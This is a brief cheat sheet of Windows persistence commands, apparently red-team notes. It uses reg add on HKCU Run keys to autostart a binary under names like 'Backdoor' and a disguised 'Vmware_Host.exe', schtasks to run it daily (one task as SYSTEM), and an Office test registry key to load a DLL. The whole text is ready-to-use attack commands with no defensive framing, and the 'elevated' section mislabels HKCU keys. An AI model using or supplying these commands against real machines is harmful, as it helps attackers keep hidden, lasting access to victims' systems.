

### Registry Persistent
```
#Userland AutoRun Persistence:

reg query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run

reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d C:\Users\Public\meme.exe

#Elevated AutoRun Persistence:
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d C:\Users\Public\Vmware_Host.exe

reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v Vmware /t REG_SZ /d "C:\Users\Public\Vmware_Host.exe" 

reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v Vmware /t REG_SZ /d "C:\Users\Public\Vmware_Host.exe"

```
### Scheduling Persistent 
```
#Userland Scheduled Task Persistence:
schtasks /create /tn "Scheduled_Persistence" /tr "cmd.exe /c C:\Users\Public\Vmware_Host.exe" /sc daily /st 18:30

#Elevated Scheduled Task Persistence:
schtasks /create /ru "SYSTEM" /tn "System_Persistence" /tr "cmd.exe /c C:\Users\Public\Vmware_Host.exe" /sc daily /st 18:36
```

### Office Persistent 
```
reg add "HKEY_CURRENT_USER\Software\Microsoft\Office test\Special\Perf" /t REG_SZ /d C:\Users\KarMarKhaing\Service.dll
```

